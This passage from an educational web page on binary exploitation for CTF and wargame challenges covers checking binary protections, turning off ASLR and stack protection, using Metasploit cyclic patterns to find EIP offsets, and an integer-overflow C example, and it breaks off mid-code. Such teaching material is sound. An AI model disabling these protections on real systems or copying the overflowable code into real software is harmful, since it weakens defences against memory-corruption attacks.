<!DOCTYPE html>
<html class="writer-html5" lang="en" data-content_root="../">
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-R21NVEB2EY"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-R21NVEB2EY');
    </script>
    
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Binary Exploitation &mdash; tech.bitvijays.com 2.0.0 documentation</title>
      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=80d5e7a1" />
      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=19f00094" />

  
  <!--[if lt IE 9]>
    <script src="../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script src="../_static/jquery.js?v=5d32c60e"></script>
        <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
        <script src="../_static/documentation_options.js?v=51b770b3"></script>
        <script src="../_static/doctools.js?v=888ff710"></script>
        <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
        <script src="../_static/debug.js"></script>
    <script src="../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="Forensics" href="LFC-Forensics.html" />
    <link rel="prev" title="Appendix" href="../Series_Vulnerable_Machines/LFC-VM-P4-Appendix.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../index.html" class="icon icon-home">
            tech.bitvijays.com
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">The Essentials</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0A-CyberSecurityEnterprise.html">Cybersecurity in an Enterprise</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0B-LinuxEssentials.html">Linux Basics</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0C-CloudEssentials.html">Cloud Infrastructure Technologies</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0E-OpenSource.html">Open Source Concepts</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0D-SecureSoftware.html">Secure Software Development Fundamentals</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0F-IndustrialControlSystems.html">Industrial Control Systems</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Infrastructure Pentest</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P1-IntelligenceGathering.html">Intelligence Gathering</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P2-VulnerabilityAnalysis.html">Vulnerability Analysis</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P3-Exploitation.html">Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P4-PostExploitation.html">Post Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P5-Reporting.html">Reporting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P6-ConfigurationReview.html">Configuration Review</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Vulnerable Machines</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P0-InitialRecon.html">Initial Recon</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P1-FromNothingToUnprivilegedShell.html">From Nothing to a Unprivileged Shell</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P2-UnprivilegedToPrivilegedShell.html">Unprivileged Shell to Privileged Shell</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P3-TipsAndTricks.html">Tips and Tricks</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P4-Appendix.html">Appendix</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">CTF - Challenges</span></p>
<ul class="current">
<li class="toctree-l1 current"><a class="current reference internal" href="#">Binary Exploitation</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#basics">Basics</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#initial-checks">Initial Checks?</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#binary-architecture">Binary Architecture</a></li>
<li class="toctree-l4"><a class="reference internal" href="#binary-help">Binary Help?</a></li>
<li class="toctree-l4"><a class="reference internal" href="#binary-protection">Binary Protection</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#pie-enabled">PIE Enabled</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="#eip-offsets">EIP Offsets?</a></li>
<li class="toctree-l4"><a class="reference internal" href="#others">others</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#integar-overflow">Integar Overflow</a></li>
<li class="toctree-l2"><a class="reference internal" href="#buffer-overflow">Buffer overflow</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#executable-stack">Executable Stack</a></li>
<li class="toctree-l3"><a class="reference internal" href="#non-executable-stack-aslr-disabled">Non-executable stack, ASLR Disabled</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#export-a-environment-variable">Export a environment variable</a></li>
<li class="toctree-l4"><a class="reference internal" href="#return2libc">Return2libc</a></li>
<li class="toctree-l4"><a class="reference internal" href="#return-oriented-programming">Return-Oriented Programming</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#non-executable-stack-aslr-enabled">Non-Executable Stack, ASLR Enabled</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#find-the-offset-of-system-exit-and-bin-sh">Find the offset of system, exit and /bin/sh</a></li>
<li class="toctree-l4"><a class="reference internal" href="#creation-of-exploit">Creation of exploit</a></li>
<li class="toctree-l4"><a class="reference internal" href="#calling-the-targetted-binary-multiple-times">Calling the targetted binary multiple times</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#format-string-vulnerability">Format String Vulnerability</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#definition">Definition</a></li>
<li class="toctree-l3"><a class="reference internal" href="#behaviour-of-the-format-function">Behaviour of the format function</a></li>
<li class="toctree-l3"><a class="reference internal" href="#crashing-the-program">Crashing the Program</a></li>
<li class="toctree-l3"><a class="reference internal" href="#viewing-the-stack">Viewing the stack</a></li>
<li class="toctree-l3"><a class="reference internal" href="#viewing-memory-at-any-location">Viewing Memory at any location</a></li>
<li class="toctree-l3"><a class="reference internal" href="#overwriting-of-arbitrary-memory">Overwriting of Arbitrary Memory</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#direct-parameter-access">Direct Parameter Access</a></li>
<li class="toctree-l4"><a class="reference internal" href="#write-two-bytes">Write two bytes</a></li>
<li class="toctree-l4"><a class="reference internal" href="#write-four-bytes">Write four bytes</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#heap-exploitation">Heap Exploitation</a></li>
<li class="toctree-l2"><a class="reference internal" href="#shared-library">Shared Library</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#hijack-the-global-offset-table-with-pointers">Hijack the Global Offset Table with pointers</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id1">Definition</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#tips-and-tricks">Tips and Tricks</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#appendix">Appendix</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#gdb-basics">GDB Basics</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#getting-inputs">Getting inputs</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#getting-inputs-from-char-argv">Getting inputs from char *argv[]</a></li>
<li class="toctree-l5"><a class="reference internal" href="#getting-inputs-from-a-file">Getting inputs from a file</a></li>
<li class="toctree-l5"><a class="reference internal" href="#getting-inputs-from-stdin">Getting inputs from stdin</a></li>
<li class="toctree-l5"><a class="reference internal" href="#getting-inputs-from-network">Getting inputs from network</a></li>
<li class="toctree-l5"><a class="reference internal" href="#keep-the-stdin-open-after-injection">Keep the stdin open after injection</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="#examining-data">Examining Data</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#examining-functions">Examining functions</a></li>
<li class="toctree-l5"><a class="reference internal" href="#examining-memory">Examining Memory</a></li>
<li class="toctree-l5"><a class="reference internal" href="#id2">Examining Data</a></li>
<li class="toctree-l5"><a class="reference internal" href="#examining-frames">Examining Frames</a></li>
<li class="toctree-l5"><a class="reference internal" href="#examining-registers">Examining Registers</a></li>
<li class="toctree-l5"><a class="reference internal" href="#setting-program-variable">Setting program variable</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#radare2-basics">Radare2 Basics</a></li>
<li class="toctree-l3"><a class="reference internal" href="#appendix-ii-ld-preload">Appendix-II LD_PRELOAD</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#hijacking-functions">Hijacking Functions</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#important-things-to-note">Important things to note</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="#controlling-uninitialized-memory-with-ld-preload">Controlling uninitialized memory with LD_PRELOAD</a></li>
<li class="toctree-l4"><a class="reference internal" href="#libc-rpath">LIBC - Rpath</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#rpath">RPATH</a></li>
<li class="toctree-l5"><a class="reference internal" href="#libc-start-main">libc_start_main</a></li>
<li class="toctree-l5"><a class="reference internal" href="#gmon-start">gmon_start</a></li>
<li class="toctree-l5"><a class="reference internal" href="#version-reference">Version Reference</a></li>
<li class="toctree-l5"><a class="reference internal" href="#ld-debug-environment-variable">LD_DEBUG environment variable</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="#ulimit">ulimit</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#appendix-iii-basic-concepts">Appendix-III Basic Concepts</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#registers">Registers</a></li>
<li class="toctree-l4"><a class="reference internal" href="#stack">Stack</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#uses">Uses</a></li>
<li class="toctree-l5"><a class="reference internal" href="#example">Example</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="#calling-conventions">Calling Conventions</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#cdecl">cdecl</a></li>
<li class="toctree-l5"><a class="reference internal" href="#sysv">SysV</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="#global-offset-table">Global Offset Table</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#plt">PLT</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="#buffer">Buffer</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#buffer-overflow-examples">Buffer Overflow Examples</a></li>
<li class="toctree-l3"><a class="reference internal" href="#format-string-examples">Format String Examples</a></li>
<li class="toctree-l3"><a class="reference internal" href="#miscellanous-examples">Miscellanous Examples</a></li>
<li class="toctree-l3"><a class="reference internal" href="#changelog">Changelog</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="LFC-Forensics.html">Forensics</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFC-ReverseEngineering.html">Reverse Engineering</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFC-Cryptography.html">Cryptography</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFC-CodingQuickRef.html">Coding Quick Reference</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Critical Infrastructure</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Critical_Infrastructure/LFF-CIS-ElectricalGrid.html">Electrical Grid</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">tech.bitvijays.com</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
      <li class="breadcrumb-item active">Binary Exploitation</li>
      <li class="wy-breadcrumbs-aside">
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="binary-exploitation">
<h1>Binary Exploitation<a class="headerlink" href="#binary-exploitation" title="Link to this heading"></a></h1>
<p>This post (Work in Progress) lists the tips and tricks while doing Binary Exploitation challenges during various CTF’s and Over The Wire Wargame.</p>
<p><strong>Thanks to superkojiman, barrebas, et0x who helped me learning the concepts.</strong></p>
<section id="basics">
<h2>Basics<a class="headerlink" href="#basics" title="Link to this heading"></a></h2>
<p>Let’s start with some basic concepts and then we would see some examples which would help to clear the concepts.</p>
<ul class="simple">
<li><p>Big-endian systems store the most significant byte of a word in the smallest address and the least significant byte is stored in the largest address. Little-endian systems, in contrast, store the least significant byte in the smallest address. {% img left /images/big-endian.png 250 250 %} {% img right /images/little-endian.png 250 250 %}</p></li>
</ul>
<section id="initial-checks">
<h3>Initial Checks?<a class="headerlink" href="#initial-checks" title="Link to this heading"></a></h3>
<p>When you get a binary for exploitation, we need to find whether it is 32-bit or 64-bit ELF, which platform it is running, whether any buffer overflow prevention techniques has been used, what is EIP offset.</p>
<section id="binary-architecture">
<h4>Binary Architecture<a class="headerlink" href="#binary-architecture" title="Link to this heading"></a></h4>
<p>Executable binary is running on whether x86 or x86-64.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">uname</span> <span class="o">-</span><span class="n">a</span>
</pre></div>
</div>
<p>Whether the binary is compiled for 32 bit or 64 bit.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">file</span> <span class="n">binary_file</span>
</pre></div>
</div>
</section>
<section id="binary-help">
<h4>Binary Help?<a class="headerlink" href="#binary-help" title="Link to this heading"></a></h4>
<p>Probably a good idea to just run the binary with -h or –help flag to check if any help documentation is provided.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ ./flagXX -h
Usage: php [options] [-f] &lt;file&gt; [--] [args...]
      php [options] -r &lt;code&gt; [--] [args...]
</pre></div>
</div>
</section>
<section id="binary-protection">
<h4>Binary Protection<a class="headerlink" href="#binary-protection" title="Link to this heading"></a></h4>
<p>Multiple Buffer overflow prevention techniques such as RELRO, NoExecute (NX), Stack Canaries, Address Space Layout Randomization (ASLR) and Position Independent Executables (PIE).</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Address</span> <span class="n">space</span> <span class="n">Layout</span> <span class="n">Randomization</span>     <span class="p">:</span> <span class="n">Kernel</span>
<span class="n">Executable</span> <span class="n">Stack</span> <span class="n">Protection</span>            <span class="p">:</span> <span class="n">Compiler</span>
<span class="n">Stack</span> <span class="n">smashing</span> <span class="n">protection</span>              <span class="p">:</span> <span class="n">Compiler</span>
<span class="n">Position</span> <span class="n">Independent</span> <span class="n">Executables</span>       <span class="p">:</span> <span class="n">Compiler</span>
<span class="n">Fortify</span> <span class="n">Source</span>                         <span class="p">:</span> <span class="n">Compiler</span>
<span class="n">Stack</span> <span class="n">Protector</span>                        <span class="p">:</span> <span class="n">Compiler</span>
</pre></div>
</div>
<ul class="simple">
<li><p>Which buffer overflow prevention techniques are used can be found by running Checksec Script. This script is present in gdb-peda.</p></li>
<li><p>Whether the stack of binary is executable is not can be found by readelf tool. If Program header GNU_STACK has RWE flag, if it has E flag, it’s executable.</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span>narnia8@melinda:~$ readelf -l /narnia/narnia8 | grep GNU_STACK
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
</pre></div>
</div>
<p>In order to make the stack executable, the program needs to be compiled with -z execstack option and to disable stack smashing option -fno-stack-protector should be used.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">gcc</span> <span class="o">-</span><span class="n">ggdb</span> <span class="o">-</span><span class="n">m32</span> <span class="o">-</span><span class="n">fno</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">protector</span> <span class="o">-</span><span class="n">z</span> <span class="n">execstack</span> <span class="o">-</span><span class="n">o</span> <span class="n">buffer1</span> <span class="n">buffer1</span><span class="o">.</span><span class="n">c</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Address Space Layout Randomization (ASLR) controlled by /proc/sys/kernel/randomize_va_space.</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Three</span> <span class="n">Values</span><span class="p">:</span>
<span class="mi">0</span>  <span class="p">:</span> <span class="n">Disable</span> <span class="n">ASLR</span><span class="o">.</span> <span class="n">This</span> <span class="n">setting</span> <span class="ow">is</span> <span class="n">applied</span> <span class="k">if</span> <span class="n">the</span> <span class="n">kernel</span> <span class="ow">is</span> <span class="n">booted</span> <span class="k">with</span> <span class="n">the</span> <span class="n">norandmaps</span> <span class="n">boot</span> <span class="n">parameter</span><span class="o">.</span>
<span class="mi">1</span>  <span class="p">:</span> <span class="n">Randomize</span> <span class="n">the</span> <span class="n">positions</span> <span class="n">of</span> <span class="n">the</span> <span class="n">stack</span><span class="p">,</span> <span class="n">virtual</span> <span class="n">dynamic</span> <span class="n">shared</span> <span class="nb">object</span> <span class="p">(</span><span class="n">VDSO</span><span class="p">)</span> <span class="n">page</span><span class="p">,</span> <span class="ow">and</span> <span class="n">shared</span> <span class="n">memory</span> <span class="n">regions</span><span class="o">.</span> <span class="n">The</span> <span class="n">base</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span> <span class="n">data</span> <span class="n">segment</span> <span class="ow">is</span> <span class="n">located</span> <span class="n">immediately</span> <span class="n">after</span> <span class="n">the</span> <span class="n">end</span> <span class="n">of</span> <span class="n">the</span> <span class="n">executable</span> <span class="n">code</span> <span class="n">segment</span><span class="o">.</span>
<span class="mi">2</span>  <span class="p">:</span> <span class="n">Randomize</span> <span class="n">the</span> <span class="n">positions</span> <span class="n">of</span> <span class="n">the</span> <span class="n">stack</span><span class="p">,</span> <span class="n">VDSO</span> <span class="n">page</span><span class="p">,</span> <span class="n">shared</span> <span class="n">memory</span> <span class="n">regions</span><span class="p">,</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">data</span> <span class="n">segment</span><span class="o">.</span> <span class="n">This</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">default</span> <span class="n">setting</span><span class="o">.</span>
</pre></div>
</div>
<p>You can change the setting temporarily by writing a new value to /proc/sys/kernel/randomize_va_space, for example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="n">value</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">randomize_va_space</span>
</pre></div>
</div>
<p>To change the value permanently, add the setting to /etc/sysctl.conf, for example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">kernel</span><span class="o">.</span><span class="n">randomize_va_space</span> <span class="o">=</span> <span class="n">value</span>
<span class="ow">and</span> <span class="n">run</span> <span class="n">the</span> <span class="n">sysctl</span> <span class="o">-</span><span class="n">p</span> <span class="n">command</span><span class="o">.</span>
</pre></div>
</div>
<p>If you change the value of randomize_va_space, you should test your application stack to ensure that it is compatible with the new setting. If necessary, you can disable ASLR for a specific program and its child processes by using the following command:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>% setarch `uname -m` -R program [args ...]
</pre></div>
</div>
</div></blockquote>
<section id="pie-enabled">
<h5>PIE Enabled<a class="headerlink" href="#pie-enabled" title="Link to this heading"></a></h5>
<p>If a binary is PIE enabled, we won’t be able to get the addresses until we run it. So, one of the way is to disable ASLR on linux, that way addresses are always the same during analysis.</p>
<ul class="simple">
<li><p>Use the start command in gdb to load the binary and break at _start</p></li>
<li><p>then use vmmap (if using pwndbg) to see memory layout. If you want the starting address of binary</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vmmap</span>
<span class="n">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
<span class="mh">0x555555554000</span>     <span class="mh">0x555555556000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">2000</span> <span class="mi">0</span>      <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">work</span><span class="o">/</span><span class="n">lucky</span><span class="o">/</span><span class="n">lucky</span>
<span class="mh">0x555555756000</span>     <span class="mh">0x555555757000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">1000</span> <span class="mi">2000</span>   <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">work</span><span class="o">/</span><span class="n">lucky</span><span class="o">/</span><span class="n">lucky</span>
<span class="mh">0x555555757000</span>     <span class="mh">0x555555758000</span> <span class="n">rwxp</span>     <span class="mi">1000</span> <span class="mi">3000</span>   <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">work</span><span class="o">/</span><span class="n">lucky</span><span class="o">/</span><span class="n">lucky</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>So starting address is 0x555555554000; from here we can set breakpoints by adding the offset in IDA.</p></li>
<li><p>You can see the offsets in IDA if you go to Options &gt; General and check Line Prefixes</p></li>
<li><p>Now you can set a breakpoint. Eg if strcpy() is offset 0x123, then you can do</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">br</span> <span class="o">*</span><span class="mh">0x555555554000</span><span class="o">+</span><span class="mh">0x123</span>
</pre></div>
</div>
</div></blockquote>
</section>
</section>
<section id="eip-offsets">
<h4>EIP Offsets?<a class="headerlink" href="#eip-offsets" title="Link to this heading"></a></h4>
<p>To know the EIP offset, you can use cyclic patterns. Use pattern_create.rb to create a random pattern which can be used to find the offset and pattern_offset.rb to find the exact offset.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">pattern_create</span><span class="o">.</span><span class="n">rb</span> <span class="o">-</span><span class="n">l</span> <span class="mi">200</span>
<span class="n">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span>

<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">pattern_offset</span><span class="o">.</span><span class="n">rb</span> <span class="o">-</span><span class="n">q</span> <span class="mh">0x37654136</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Exact</span> <span class="n">match</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">140</span>
</pre></div>
</div>
</section>
<section id="others">
<h4>others<a class="headerlink" href="#others" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>Check all the ways user input is provided to the program.</p></li>
<li><p>Check all the <code class="docutils literal notranslate"><span class="pre">printf</span></code> statement, see if there exists a <code class="docutils literal notranslate"><span class="pre">printf</span></code> that directly prints the user input (possible format string vulnerability).</p></li>
<li><p>Check how the flag or input is stored? Stack (variable/reading a file?) or heap? (dynamic allocation - malloc).</p></li>
</ul>
</section>
</section>
</section>
<section id="integar-overflow">
<h2>Integar Overflow<a class="headerlink" href="#integar-overflow" title="Link to this heading"></a></h2>
<ul class="simple">
<li><p>A Signed Integer, which has a range between <code class="docutils literal notranslate"><span class="pre">-2,147,483,648</span></code> to <code class="docutils literal notranslate"><span class="pre">2,147,483,647</span></code>.</p></li>
<li><p>Signed integers use the first bit to store whether it is negative or positive, <code class="docutils literal notranslate"><span class="pre">0</span></code> indicating positive and <code class="docutils literal notranslate"><span class="pre">1</span></code> indicating negative.</p></li>
<li><p>What happens if you add <code class="docutils literal notranslate"><span class="pre">1</span></code> to <code class="docutils literal notranslate"><span class="pre">2,147,483,647</span></code> and store the result in a signed integer? Well the first bit goes from <code class="docutils literal notranslate"><span class="pre">0</span></code> to <code class="docutils literal notranslate"><span class="pre">1</span></code>, meaning that the number is now negative! In fact, due to the way Two’s Complement, the method used to represent negative numbers in binary, works, it actually wraps around to the most negative integer: <code class="docutils literal notranslate"><span class="pre">-2,147,483,648</span></code>.</p></li>
</ul>
<p>Example</p>
<div class="highlight-C notranslate"><div class="highlight"><pre><span></span><span class="w">   </span><span class="k">if</span><span class="p">(</span><span class="n">auction_choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">){</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;These knockoff Flags cost 900 each, enter desired quantity</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">number_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
<span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">number_flags</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">number_flags</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">){</span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">total_cost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">        </span><span class="n">total_cost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">900</span><span class="o">*</span><span class="n">number_flags</span><span class="p">;</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">The final cost is: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">total_cost</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">total_cost</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">account_balance</span><span class="p">){</span>
<span class="w">            </span><span class="n">account_balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">account_balance</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">total_cost</span><span class="p">;</span>
<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Your current balance after transaction: %d</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">account_balance</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">else</span><span class="p">{</span>
<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Not enough funds to complete purchase</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">auction_choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="p">){</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;1337 flags cost 100000 dollars, and we only have 1 in stock</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
